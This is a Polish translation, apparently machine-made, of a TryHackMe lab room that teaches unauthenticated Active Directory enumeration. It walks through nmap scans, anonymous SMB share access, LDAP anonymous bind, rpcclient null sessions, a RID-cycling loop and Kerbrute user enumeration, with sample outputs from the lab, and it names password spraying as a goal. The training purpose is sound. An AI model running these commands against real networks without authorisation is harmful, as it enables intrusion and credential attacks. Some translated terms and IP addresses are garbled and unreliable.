---

Usługa Active Directory (OGŁOSZENIE) enumeracja jest kluczowym pierwszym krokiem w testowaniu penetracyjnym sieci korporacyjnych Microsoft Windows. Podczas wielu wewnętrznych testów penetracyjnych często otrzymujemy…VPN Dostęp do sieci docelowej bez danych uwierzytelniających użytkownika. Oznacza to, że musimy zebrać jak najwięcej informacji o domenie: użytkownikach, grupach, komputerach i zasadach. Pozwoli nam to zidentyfikować potencjalne luki w zabezpieczeniach lub ścieżki ataku, które mogą dać nam punkt zaczepienia, na przykład dostęp do stacji roboczej użytkownika.

## Cele edukacyjne

W tym pokoju nauczymy się:

- Podaj domenę docelową i sieć.
- Wypisz prawidłowych użytkowników domeny i zidentyfikuj błędne konfiguracje.
- Przeprowadź ataki polegające na rozpylaniu haseł, aby zdobyć pierwszą parę prawidłowych danych uwierzytelniających AD.
- Odkryj poufne dane uwierzytelniające zapisane w plikach konfiguracyjnych.

## Wymagania dotyczące pokoju

Przed rozpoczęciem zajęć wymagana jest solidna znajomość systemu MS Windows, Active Directory, Linux, a także zalecane jest zapoznanie się z sieciami. Możesz poszerzyć lub odświeżyć swoją wiedzę na te tematy, sprawdzając następujące moduły:

- Moduł [Podstawy systemu Windows i usługi AD](https://tryhackme.com/module/windows-and-active-directory-fundamentals) , w tym ostatnia sala – Podstawy [usługi Active Directory](https://tryhackme.com/room/winadbasics)
- Moduł [Podstawy](https://tryhackme.com/module/linux-fundamentals) Linuksa
- Moduł wiersza [poleceń](https://tryhackme.com/module/command-line)
- Moduł [sieciowy](https://tryhackme.com/module/networking)​

## Uruchamianie sieci

Zanim przejdziesz do następnego zadania, kliknij zielony przycisk **Start** pod schematem sieci. Daj sieci wystarczająco dużo czasu na uruchomienie.

Z siecią można połączyć się na dwa sposoby:

**Opcja 1: Użycie AttackBox**

Kliknij przycisk **„Uruchom AttackBox”** u góry tego pokoju. Gdy AttackBox będzie gotowy, będzie dostępny na podzielonym ekranie.

**Opcja 2: Przez połączenie VPN**

Alternatywnie, możesz połączyć się z siecią przez VPN. Aby nawiązać połączenie VPN z tą siecią, przejdź do strony [dostępu](https://tryhackme.com/access) , kliknij kartę **Sieci** , wybierz **Jr-Pentester-AD-v01** i naciśnij przycisk **Pobierz plik konfiguracyjny** . Pamiętaj, że jeśli nie widzisz tego pliku dostępnego do pobrania, upewnij się, że sieć w pokoju została uruchomiona i poczekaj kilka minut.

![Na karcie Sieci musisz wybrać Jr-Pentester-AD-v01 i kliknąć przycisk Pobierz plik konfiguracyjny.](https://cdn-images.tryhackme.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1747151317482.png)

Następnie uruchom poniższe polecenie w tym samym katalogu, w którym znajduje się plik konfiguracyjny sieci VPN:

`sudo openvpn [your_configuration_file_name.ovpn]`

Jeśli masz problemy z połączeniem się z siecią VPN, zapoznaj się z [tym artykułem pomocy](https://help.tryhackme.com/en/articles/6496058-troubleshooting-openvpn-on-linux-and-mac) .

**Uwaga 1** : Jeśli jesteś **użytkownikiem wersji bezpłatnej** , powinieneś używać własnej maszyny wirtualnej z profilem VPN opisanym powyżej.

**Uwaga 2** : Jeśli jesteś **użytkownikiem premium** , ważne jest, aby nie **używać** AttackBox i połączenia VPN jednocześnie.

## Sprawdzanie łączności z siecią

Możesz uruchomić `route`polecenie, aby sprawdzić, czy komputer atakującego może komunikować się z siecią docelową. Poniższy terminal pokazuje przykładowe dane wyjściowe.

Terminal

```shell-session
root@tryhackme:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.0.1       0.0.0.0         UG    100    0        0 ens5
10.10.0.0       0.0.0.0         255.255.0.0     U     100    0        0 ens5
10.10.0.1       0.0.0.0         255.255.255.255 UH    100    0        0 ens5
[...]
10.211.11.0     10.250.11.1     255.255.255.0   UG    1000   0        0 tun0
10.250.11.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
[...]
```

Alternatywnie możesz użyć `ip route`polecenia.

Terminal

```shell-session
root@tryhackme:~# ip route
default via 10.10.0.1 dev ens5 proto dhcp src 10.10.130.73 metric 100 
10.10.0.0/16 dev ens5 proto kernel scope link src 10.10.130.73 metric 100 
10.10.0.1 dev ens5 proto dhcp scope link src 10.10.130.73 metric 100 
[...]
10.211.11.0/24 via 10.250.11.1 dev tun0 metric 1000 
10.250.11.0/24 dev tun0 proto kernel scope link src 10.250.11.2 
[...]
```

Sprawdź, czy podsieć jest widoczna `10.211.11.0`w wynikach polecenia. Jeśli tak, Twój komputer powinien móc komunikować się z siecią docelową. Możesz również użyć polecenia `ping`na komputerach laboratoryjnych.

## Rozwiązywanie problemów z łącznością

Jeśli nie możesz połączyć się z siecią z poziomu AttackBoxa, otwórz terminal i uruchom polecenie `tryconnectme`. Spowoduje to uruchomienie skryptu rozwiązywania problemów:

Terminal

```shell-session
root@tryhackme# tryconnectme                                                  

TryHackMe's network room connection debugger, at your service!

Before we dive deeper, please make sure that you are only using the AttackBox
and do not have your network VPN profile running anywhere!

The AttackBox uses the same VPN profile as you would use on your own machine
and you are only allowed to run the VPN profile once!

If you are running in two places, stop the other VPN and restart the AttackBox please!

If you confirm that you are only using the AttackBox, press [Y], otherwise, the debugger will quit: Y
```

Gdy już upewnisz się, że łączysz się z siecią wyłącznie za pośrednictwem AttackBox, możesz wprowadzić następujący adres IP:`10.211.11.10`

Terminal

```shell-session
[...]
In the network room, look at the network diagram and please provide an IP address being shown to you there.
Format should be X.X.X.X: 10.211.11.10

Trying to ping the VPN server at 10.211.11.250...
```

Następnie postępuj zgodnie z instrukcjami skryptu. Gdy skrypt poprosi o podanie serwera VPN, wpisz **Jr-Pentester-AD-v01.**

Jeśli napotkasz jakiekolwiek problemy, skontaktuj się z nami na [Discordzie(otwiera się w nowej karcie)](https://discord.com/invite/tryhackme)lub przez e-mail na adres `support@tryhackme.com`.

Właśnie nam dano VPN Dostęp do sieci Active Directory. Nie mamy jeszcze żadnych danych uwierzytelniających; jedynie nasza maszyna atakująca jest wyposażona w najlepsze i najnowsze narzędzia. Naszym celem jest odkrycie struktury środowiska Active Directory, identyfikacja hostów i usług oraz mapowanie sieci. Wyobraźmy sobie na chwilę, że nie mamy przejrzystego diagramu sieci i mamy następującą podsieć jako część naszego zakresu: `10.211.11.0/24`

## Odkrywanie hosta

Jedną z pierwszych rzeczy, które możemy zrobić, jest przeprowadzenie skanowania podsieci w celu wykrycia hostów. Pozwoli nam to zidentyfikować wszystkie aktywne hosty w naszym docelowym zakresie sieci. Większość klientów uwzględnia zakres podsieci w zakresie pentestu, dlatego musimy wykryć wszystkie aktywne hosty, które chcemy objąć badaniem. Zaprezentujemy dwa różne narzędzia, które można wykorzystać do wstępnego wykrywania hostów.

**fping**

Podobnie jak **polecenie ping** , **fping** wykorzystuje żądania protokołu ICMP (Internet Control Message Protocol) do określenia, czy host jest aktywny, czy nie. Jednak w przypadku **fping** możemy określić dowolną liczbę celów, w tym podsieć, co czyni go bardziej wszechstronnym niż polecenie **ping** . Zamiast wysyłać pakiet do jednego celu, aż do momentu uzyskania odpowiedzi lub przekroczenia limitu czasu, **fping** po każdym żądaniu przechodzi do kolejnego celu.

Aby wykryć aktywne hosty w naszej sieci docelowej, możemy uruchomić następujące polecenie:

Terminal

```shell-session
user@tryhackme$ fping -agq 10.211.11.0/24
10.211.11.1
10.211.11.10
10.211.11.20
10.211.11.250
```

- `-a`:pokazuje systemy, które są żywe.
- `-g`:generuje listę docelową na podstawie dostarczonej maski sieciowej IP.
- `-q`:tryb cichy, nie wyświetla wyników poszczególnych sond ani komunikatów o błędach ICMP.

Po uruchomieniu tego polecenia identyfikujemy cztery aktywne hosty. **10.200.12.1** to brama, a **10.200.12.250** to serwer VPN, więc możemy zignorować te dwa hosty, ponieważ są poza zakresem. Możemy wygodnie dodać dwa odkryte systemy IPS do pliku tekstowego o nazwie „hosts.txt” na potrzeby skanowania portów.

Przykładowy terminal

```shell-session
user@tryhackme$ cat hosts.txt
10.211.11.20
10.211.11.10
```

**Nmap**

Możemy również użyć Nmap w trybie skanowania ping ( `-sn`) do zbadania całej podsieci:

`nmap -sn 10.211.11.0/24`

- `-sn`:Skanowanie ping w celu ustalenia, które hosty są aktywne, bez konieczności skanowania portów.

## Skanowanie portów

Po odkryciu aktywnych hostów musimy zidentyfikować, który z nich jest kontrolerem domeny (DC), aby ustalić, które krytyczne usługi związane z Active Directory są używane i mogą zostać wykorzystane. Oto kilka typowych portów i protokołów Active Directory:

|Port|Protokół|Co to znaczy|
|---|---|---|
|88|Kerberos|Potencjał dla enumeracji opartej na Kerberos|
|135|MS-RPC|Możliwość wyliczenia RPC (sesje zerowe)|
|139|SMB/NetBIOS|Dostęp do starszych wersji SMB|
|389|LDAP|Zapytania LDAP do AD|
|445|MŚP|Nowoczesny dostęp SMB ma kluczowe znaczenie dla enumeracji|
|464|Kerberos (kpasswd)|Usługa Kerberos związana z hasłem|

Możemy uruchomić skanowanie wersji usługi z użyciem następujących portów, aby pomóc zidentyfikować kontroler domeny:

`nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt`

- `-sV`:Włącza wykrywanie wersji. Nmap spróbuje ustalić wersję usług działających na otwartych portach.
- `-sC`:BiegnieNmapSkrypty Scripting Engine (NSE) w kategorii domyślnej.
- `-iL`: Polecenie to nakazuje programowi Nmap odczytanie listy hostów docelowych z pliku `hosts.txt`. Każdy wiersz w tym pliku powinien zawierać pojedynczy adres IP lub nazwę hosta.

Możemy rozpoznać kontroler domeny, ponieważ często ma otwarte porty 88 (Kerberos), 389 (LDAP) i 445 (SMB), a na wyjściu polecenia nmap pojawiają się banery takie jak „Windows Server” lub nawet nazwy domen.

Gdybyśmy przeprowadzali bardziej szczegółową ocenę lub pracowali w nieznanym środowisku, rozpoczęcie od pełnego skanowania portów gwarantuje, że nie pominiemy krytycznych usług działających na niestandardowych portach. Możemy użyć tego polecenia do przeskanowania wszystkich otwartych portów:

`nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt`

- `-sS`:Skanowanie TCP SYN, które jest bardziej dyskretne niż pełne skanowanie połączenia
- `-p-`:Skanuje wszystkie 65 535TCPporty.
- `-T3`: Ustawia szablon czasowy na „normalny”, aby zrównoważyć prędkość i ukrycie.
- `-iL hosts.txt`: Wprowadza listę aktywnych hostów z poprzedniego polecenia nmap.
- `-oN full_port_scan.txt`:Wyświetla wyniki w pliku.

Dzięki tym technikom enumeracji zidentyfikowaliśmy dwóch aktywnych hostów w naszej sieci docelowej, jednegoDCi jedną stację roboczą oraz domenę. Potwierdziliśmy również kilka znanych usług działających na kontrolerze domeny, które możemy wykorzystać do dalszego enumerowania domeny.

W tym zadaniu zakładamy, że naruszyliśmy obwód sieci korporacyjnej i mamy dostęp doLinux-na bazie komputera. Będziemy używać AttackBoxa; możesz jednak podłączyć swoją ulubioną ofensywną dystrybucję LinuksaVPN.

Skupimy się na wyliczaniu udziałów sieciowych przy użyciu bloku komunikatów serwera (MŚP) protokołu. Będziemy używać różnych narzędzi, takich jakNmapAby odkryć odpowiednie porty nasłuchujące i zidentyfikować usługi. Następnie spróbujemy uzyskać dostęp do ich zawartości z poziomu AttackBox za pomocą narzędzi takich jak `smbclient`i `smbmap`. Ponadto spróbujemy pobrać zawartość dostępnych udziałów SMB. Na koniec wspomnimy o kilku innych istotnych narzędziach. Zaczynajmy!

## Odkrywanie usług

Rozpoczniemy nasze „odkrywanie” od starego, dobrego Nmapa. Interesują nas głównie porty związane z systemem MS Windows i usługą Active Directory. Ograniczymy skanowanie do następujących portów:

- **TCP 88 (Kerberos)** : Kerberos używa tego portu do uwierzytelniania w Active Directory. Z punktu widzenia testów penetracyjnych może to być kopalnia złota dla ataków biletowych, takich jak Pass-the-Ticket i Kerberoasting.
- **TCP 135 (mapowanie punktów końcowych RPC)** : Ten port TCP jest używany do zdalnego wywoływania procedur (RPC). Może być wykorzystywany do identyfikacji usług w celu przemieszczania się w poziomie lub zdalnego wykonywania kodu za pośrednictwem DCOM.
- **TCP 139 (NetBIOS Session Service)** : Ten port służy do udostępniania plików w starszych systemach Windows. Może być wykorzystywany do sesji zerowych i gromadzenia informacji.
- **TCP 389 (LDAP)** : Ten port TCP jest używany przez protokół LDAP (Lightweight Directory Access Protocol). Jest on w postaci zwykłego tekstu i może być głównym celem enumeracji obiektów, użytkowników i zasad usługi Active Directory.
- **TCP 445 (SMB)** : krytyczny dla udostępniania plików i zdalnego administrowania; wykorzystywany do takich celów jak EternalBlue, ataki typu SMB relay i kradzież danych uwierzytelniających.
- **TCP 636 (LDAPS)** : Ten port jest używany przez protokół Secure LDAP. Chociaż jest szyfrowany, może ujawnić strukturę usługi Active Directory (AD) w przypadku nieprawidłowej konfiguracji i może zostać wykorzystany w atakach opartych na certyfikatach, takich jak eksploitacja AD CS.

Możemy użyć skanera Nmap, aby sprawdzić, czy na tych portach nasłuchują jakieś aktywne usługi, spróbować wykryć ich wersje za pomocą `-sV`, a następnie zezwolić na uruchamianie domyślnych skryptów za pomocą `-sC`. Nasze ostatnie polecenie będzie wyglądać następująco: `nmap -p 88,135,139,389,445,636 -sV -sC TARGET_IP`. Wynik skanowania kontrolera domeny pokazano poniżej.

Terminal AttackBox

```shell-session
root@tryhackme:~# nmap -p 88,135,139,389,445,636 -sV -sC 10.211.11.10
[...]
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-15 12:41:17Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
636/tcp open  tcpwrapped
[...]
```

Powyższe otwarte porty wskazują na środowisko Active Directory MS Windows. ObecnośćKerberosILDAPporty mogą wskazywać, że jest to część domeny Active Directory lub nawet kontroler domeny.

## Notowanie akcji SMB

Na tym etapie nie mamy prawidłowych danych logowania. Sprawdźmy udostępnione udziały SMB i sprawdźmy, czy możemy połączyć się z którymś z nich anonimowo. Spróbujemy nawiązać połączenie anonimowe, znane również jako sesja zerowa, ponieważ nie używa nazwy użytkownika ani hasła, i sprawdzimy, czy uda nam się uzyskać dostęp. Istnieją dwa dobre narzędzia do enumeracji udziałów SMB z poziomu systemu Linux: `smbclient`i `smbmap`.

`smbclient`to narzędzie wiersza poleceń, które umożliwia interakcję z udziałami SMB i jest częścią pakietu Samba. Jest podobne do klienta FTP. Można go używać do wyświetlania, przesyłania, pobierania i przeglądania plików na zdalnym serwerze SMB. W poniższym terminalu próbujemy wyświetlić udziały za pomocą opcji `-L`, bez hasła, stąd ta `-N`opcja. Poniżej możemy zobaczyć kilka interesujących udziałów uruchomionych w systemie `smbclient -L //TARGET_IP -N`.

Terminal AttackBox

```shell-session
root@tryhackme:~# smbclient -L //10.211.11.10 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        AnonShare       Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SharedFiles     Disk      
        SYSVOL          Disk      Logon server share 
        UserBackups     Disk      
SMB1 disabled -- no workgroup available
```

Innym narzędziem jest `smbmap`, narzędzie rozpoznawcze, które enumeruje udziały SMB na hoście. Można go użyć do wyświetlenia uprawnień odczytu i zapisu dla każdego udziału. Jest ono pomocne w szybkiej identyfikacji dostępnych lub nieprawidłowo skonfigurowanych udziałów bez konieczności ręcznego łączenia się z każdym z nich. Poniżej znajduje się przykład uruchomienia `smbmap -H TARGET_IP`. Należy zauważyć, że `smbmap`znajduje się on `/root/Desktop/Tools/Miscellaneous/smbmap`w AttackBox.

Terminal AttackBox

```shell-session
root@tryhackme:~/Desktop/Tools/Miscellaneous/smbmap# ./smbmap.py -H 10.211.11.10
[+] Finding open SMB ports....
[+] User SMB session established on 10.211.11.10...
[+] IP: 10.211.11.10:445        Name: 10.211.11.10        
        Disk                     Permissions     Comment
        ----                     -----------     -------
        ADMIN$                   NO ACCESS       Remote Admin
        AnonShare                READ, WRITE
        C$                       NO ACCESS       Default share
        IPC$                     NO ACCESS       Remote IPC
        NETLOGON                 NO ACCESS       Logon server share 
        SharedFiles              READ, WRITE
        SYSVOL                   NO ACCESS       Logon server share 
        UserBackups              READ, WRITE
```

Uruchamiając którekolwiek z powyższych poleceń, możemy zauważyć, że naszą uwagę przykuły trzy niestandardowe udziały: `AnonShare`, `SharedFiles`i `UserBackups`.

Warto zauważyć, że za pomocą Nmapa można również sprawdzić, które udziały udzielają dostępu. `smb-enum-shares`Skrypt Nmapa pozwala sprawdzić, które udziały udzielają dostępu do ODCZYTU/ZAPISU, ODCZYTU lub go nie udzielają. Składnia jest następująca `nmap -p445 --script smb-enum-shares 10.211.11.10`:

## Uzyskiwanie dostępu do udziałów SMB

Skoro mamy już listę udziałów, spróbujmy uzyskać dostęp do tych, które umożliwiają anonimowy dostęp. Możemy znaleźć interesujące pliki, które pomogą nam uzyskać do nich dostęp. Będziemy szukać wszystkich udziałów, które miały `READ`uprawnienia dostępu po uruchomieniu `smbmap`. Aby `smbclient`połączyć się z udziałem, użyj `smbclient //TARGET_IP/SHARE_NAME -N`. Po połączeniu, wyświetliliśmy listę plików, wydając `ls`polecenie jak poniżej. Po znalezieniu nazwy pliku, możesz go pobrać za pomocą `get file_name`. W powyższym terminalu wykonaliśmy polecenie , `get Mouse_and_Malware.txt`aby pobrać plik do AttackBox.

Terminal AttackBox

```shell-session
root@tryhackme:~# smbclient //10.211.11.10/SharedFiles -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 15 16:03:40 2025
  ..                                  D        0  Thu May 15 16:03:40 2025
  Mouse_and_Malware.txt               A     1141  Thu May 15 10:40:19 2025

                7863807 blocks of size 4096. 3459432 blocks available
smb: \> get Mouse_and_Malware.txt
getting file \Mouse_and_Malware.txt of size 1141 as Mouse_and_Malware.txt (69.6 KiloBytes/sec) (average 69.6 KiloBytes/sec)
smb: \> exit
```

Ponieważ nie mamy danych logowania, próbujemy uzyskać dostęp do różnych udziałów bez hasła, tj. za pomocą `-N`opcji . Jeśli jednak posiadasz nazwę użytkownika i hasło do udziału SMB, możesz je łatwo określić za pomocą `--user=USERNAME --password=PASSWORD`lub `-U 'username%password'`. Pamiętaj, że w przypadku kont domenowych musisz określić domenę za pomocą `-W`.

## Co możemy znaleźć w akcjach SMB

Anonimowy udział SMB to fatalny pomysł. Administratorzy systemów mogli jednak włączyć go, aby umożliwić działanie starszych systemów. Być może stara drukarka musi odczytać plik lub stary skaner musi zapisać plik.

Z punktu widzenia testów penetracyjnych, udziały SMB mogą zawierać pliki konfiguracyjne, pliki kopii zapasowych, skrypty, a nawet dokumenty. W końcu dostęp do konkretnego folderu z dowolnego komputera w sieci jest wygodny. Jeśli folder pozwala na zapis, będzie to jedynie zachęcać użytkowników do przesyłania kolejnych plików. Niektóre pliki mogą zawierać nazwy użytkowników, a nawet dane uwierzytelniające z hasłem, które nigdy nie zostało zmienione. Podsumowując, dokładne przeszukanie dostępnych udziałów jest kluczowe, ponieważ można w ten sposób odkryć przydatne, ukryte sekrety.

## Inne narzędzia i zasoby

Istnieją również inne narzędzia, które mogą być bardzo przydatne. Przykładem jest `impacket-smbclient`, oparta na Pythonie implementacja , `smbclient`dostępna w zestawie narzędzi Impacket. Zestaw narzędzi Impacket jest dostępny w katalogu AttackBox `/opt/impacket/examples/`.

[CrackMapExec(otwiera się w nowej karcie)](https://www.kali.org/tools/crackmapexec/)Nie służy wyłącznie do późniejszej eksploatacji, ale także do enumeracji. Zawiera wiele modułów SMB do listowania udziałów, testowania danych uwierzytelniających i wielu innych.

„ `enum4linux`or” `enum4linux-ng`to potężne narzędzie, które wykonuje rozbudowane wyliczenia w protokole SMB. Możesz spróbować `enum4linux -a TARGET_IP`uzyskać dostęp do dużej ilości informacji. Dobrym pomysłem może być przekierowanie danych wyjściowych do pliku, aby móc je powoli przejrzeć.

Na koniec, jak wspomniano wcześniej w tym zadaniu, nie powinniśmy zapomnieć o skrypcie Nmap `smb-enum-shares`.

Teraz, gdy lepiej rozumiemy sieć naszego celu, czas na enumerację użytkowników, co pomoże nam zidentyfikować prawidłowe konta i potencjalne cele. Nazwy użytkowników można uzyskać różnymi, nieuwierzytelnionymi metodami, z których każda opiera się na różnych błędnych konfiguracjach.

W tym zadaniu przyjrzymy się niektórym narzędziom i technikom niezbędnym do pomyślnego zliczenia użytkowników.

LDAPWyliczenie (anonimowe powiązanie)
LDAP (Lightweight Directory Access Protocol) to powszechnie używany protokół do uzyskiwania dostępu do usług katalogowych, takich jak Microsoft Active Directory, i zarządzania nimi. LDAP pomaga lokalizować i organizować zasoby w sieci, w tym użytkowników, grupy, urządzenia i informacje organizacyjne, zapewniając centralny katalog, do którego aplikacje i użytkownicy mogą wysyłać zapytania.
Niektóre serwery LDAP umożliwiają anonimowym użytkownikom wykonywanie zapytań tylko do odczytu. Może to doprowadzić do ujawnienia kont użytkowników i innych informacji katalogowych.

Możemy sprawdzić, czy anonimowe powiązanie LDAP jest włączone za pomocą ldapsearch:

ldapsearch -x -H ldap://10.211.11.10 -s base

-x:Proste uwierzytelnianie, w naszym przypadku uwierzytelnianie anonimowe.
-H: Określa serwer LDAP.
-s:Ogranicza zapytanie wyłącznie do obiektu bazowego i nie przeszukuje poddrzew ani obiektów potomnych.
Jeżeli jest włączona, powinniśmy zobaczyć mnóstwo danych, podobnych do poniższych:

Terminal
user@tryhackme$ ldapsearch -x -H ldap://10.211.11.10 -s base
dn:
domainFunctionality: 6
forestFunctionality: 6
domainControllerFunctionality: 7
rootDomainNamingContext: DC=tryhackme,DC=loc
ldapServiceName: tryhackme.loc:dc$@TRYHACKME.LOC
isGlobalCatalogReady: TR
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=tryhackme,DC=loc
dnsHostName: DC.tryhackme.loc
defaultNamingContext: DC=tryhackme,DC=loc
currentTime: 20250514173531.0Z
configurationNamingContext: CN=Configuration,DC=tryhackme,DC=loc
search result
search: 2
result: 0 Success
Następnie możemy zapytać o informacje o użytkowniku za pomocą tego polecenia:

ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"

Enum4linux-ng
enum4linux-ng to narzędzie, które automatyzuje różne techniki enumeracji w systemach Windows, w tym enumerację użytkowników. Wykorzystuje protokoły SMB i RPC do gromadzenia informacji, takich jak listy użytkowników, członkostwa w grupach i szczegóły dotyczące udziałów.

Aby uzyskać jak najwięcej informacji z pliku, możemy uruchomić następujące polecenie:DC:

enum4linux-ng -A 10.211.11.10 -oA results.txt

-A: Wykonuje wszystkie dostępne funkcje wyliczeniowe (użytkownicy, grupy, udziały, zasady haseł, cykle RID, informacje o systemie operacyjnym i informacje NetBIOS).
-oA: Zapisuje dane wyjściowe do plików YAML i JSON.
Wyliczanie RPC (sesje zerowe)
Microsoft Remote Procedure Call (MSRPC) to protokół, który umożliwia programowi uruchomionemu na jednym komputerze żądanie usług od programu na innym komputerze, bez konieczności znajomości podstawowych szczegółów sieci. Dostęp do usług RPC można uzyskać za pośrednictwem protokołu SMB. Po skonfigurowaniu protokołu SMB tak, aby zezwalał na sesje zerowe, które nie wymagają uwierzytelnienia, nieuwierzytelniony użytkownik może połączyć się z udziałem IPC$ i wyliczyć użytkowników, grupy, udziały oraz inne poufne informacje z systemu lub domeny.

Aby zweryfikować dostęp do sesji zerowej, możemy uruchomić następujące polecenie:

rpcclient -U "" 10.211.11.10 -N

-U:Służy do określenia nazwy użytkownika; w naszym przypadku używamy pustego ciągu znaków w celu anonimowego logowania.
-N: Informuje RPC, aby nie pytał nas o hasło.
Jeśli się powiedzie, możemy wyliczyć użytkowników za pomocą:enumdomusers

klient rpcc
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sshd] rid:[0x649]
user:[gerald.burgess] rid:[0x650]
user:[nigel.parsons] rid:[0x651]
user:[guy.smith] rid:[0x652]
user:[jeremy.booth] rid:[0x653]
user:[barbara.jones] rid:[0x654]
user:[marion.kay] rid:[0x655]
user:[kathryn.williams] rid:[0x656]
user:[danny.baker] rid:[0x657]
user:[gary.clarke] rid:[0x658]
user:[daniel.turner] rid:[0x659]
user:[debra.yates] rid:[0x65a]
user:[jeffrey.thompson] rid:[0x65b]
user:[martin.riley] rid:[0x65c]
user:[danielle.lee] rid:[0x65d]
user:[douglas.roberts] rid:[0x65e]
user:[dawn.bolton] rid:[0x65f]
user:[danielle.ali] rid:[0x660]
user:[michelle.palmer] rid:[0x661]
user:[katie.thomas] rid:[0x662]
user:[jennifer.harding] rid:[0x663]
user:[strategos] rid:[0x664]
user:[empanadal0v3r] rid:[0x665]
user:[drgonz0] rid:[0x666]
user:[strate905] rid:[0x667]
user:[krbtgtsvc] rid:[0x668]
user:[asrepuser1] rid:[0x669]
user:[rduke] rid:[0xa31]
Możesz uruchomić pomoc w powłoce rpcclient, aby wyświetlić listę dostępnych poleceń. Z odpowiednimi uprawnieniami możemy dokładnie wyliczyć domenę za pomocą RPC.

RID Cycling
W usłudze Active Directory zakresy identyfikatorów względnych (RID) służą do przypisywania unikalnych identyfikatorów obiektom użytkowników i grup. Te RID-y są składnikami identyfikatora zabezpieczeń (SID), który jednoznacznie identyfikuje każdy obiekt w domenie. Niektóre RID-y są dobrze znane i ustandaryzowane.

500 to konto administratora, 501 to konto gościa, a 512-514 są przeznaczone dla następujących grup: administratorów domeny, użytkowników domeny i gości domeny. Konta użytkowników zazwyczaj zaczynają się od RID 1000 .

Możemy użyć polecenia enum4linux-ng , aby określić zakres RID, albo możemy zacząć od znanego zakresu, na przykład 1000-1200, i zwiększać go, gdy otrzymamy wyniki.

Jeśli enumdomusersjest ograniczony, możemy ręcznie spróbować zapytać o każdy indywidualny RID użytkownika za pomocą tego polecenia bash:

Terminal
user@tryhackme$ for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
	User Name   :	sshd
	User Name   :	gerald.burgess
	User Name   :	nigel.parsons
	User Name   :	guy.smith
	User Name   :	jeremy.booth
	User Name   :	barbara.jones 
for i in $(seq 500 2000):Najpierw uruchamiamy pętlę for, aby przejść przez zakres możliwych identyfikatorów RID i zidentyfikować prawidłowe konta użytkowników.
echo "queryuser $i":zapytanie o informacje dotyczące użytkownika powiązanego z RID $i.
2>/dev/null: Przekierowuje wszystkie komunikaty o błędach (standardowe błędy) do /dev/null, skutecznie je wyciszając.
| grep -i "User Name": filtruje dane wyjściowe, aby wyświetlić wiersze zawierające „Nazwę użytkownika”, ignorując wielkość liter ( -i).
Należy pamiętać, że wykonanie tego polecenia może potrwać 2–3 minuty.

Wyliczanie nazw użytkowników za pomocą Kerbrute
Kerberos to podstawowy protokół uwierzytelniania dla domen Microsoft Windows. W przeciwieństwie do NTLM , który opiera się na mechanizmie wyzwania-odpowiedzi, Kerberos korzysta z systemu opartego na biletach, zarządzanego przez zaufaną stronę trzecią, Centrum Dystrybucji Kluczy (KDC) . To podejście nie tylko umożliwia wzajemne uwierzytelnianie między klientem a serwerem, ale także wykorzystuje silniejsze metody szyfrowania, co czyni je ogólnie bardziej odpornym na ataki. Kerbrute to popularne narzędzie enumeracyjne służące do wymuszenia i enumeracji prawidłowych użytkowników Active Directory poprzez nadużycie wstępnego uwierzytelniania Kerberos.

Narzędzia takie jak enum4linux-ng lub rpcclient mogą zwrócić niektóre nazwy użytkowników, ale mogą to być:

Wyłączone konta
Konta bez domeny
Fałszywi użytkownicy honeypotów
Albo nawet fałszywie pozytywne wyniki
Przepuszczenie ich przez Kerbrute pozwala nam potwierdzić, którzy z nich są prawdziwymi, aktywnymi użytkownikami AD, co pozwala nam na dokładniejsze atakowanie ich za pomocą rozsyłania haseł.

Możemy utworzyć listę użytkowników, korzystając z nazw użytkowników, które zebraliśmy za pomocą poprzednich narzędzi.

Przykładowy terminal
user@tryhackme$ cat users.txt
Administrator
Guest
krbtgt
sshd
gerald.burgess
nigel.parsons
...
asrepuser1
rduke
Instalacja Kerbrute

1.) Pobierz skompilowany plik binarny dla swojego systemu operacyjnego - https://github.com/ropnop/kerbrute/releases.(otwiera się w nowej karcie)

2.) Zmień nazwę kerbrute_linux_amd64 na kerbrute.

3.) Uruchom chmod +x kerbrute, aby uczynić kerbrute'a wykonywalnym.

Należy pamiętać, że kerbrute nie jest instalowany na AttackBoxie i aby go pobrać i poeksperymentować, wymagany jest dostęp do Internetu.

Kerbrute przeprowadza siłową enumerację nazw użytkowników w Kerberos:

Przykładowy terminal
user@tryhackme$ ./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/16/25 - Ronnie Flathers @ropnop

2025/05/16 11:58:16 >  Using KDC(s):
2025/05/16 11:58:16 >  	10.211.11.10:88

2025/05/16 11:58:16 >  [+] VALID USERNAME:	 WRK$@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 guy.smith@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 sshd@tryhackme.loc
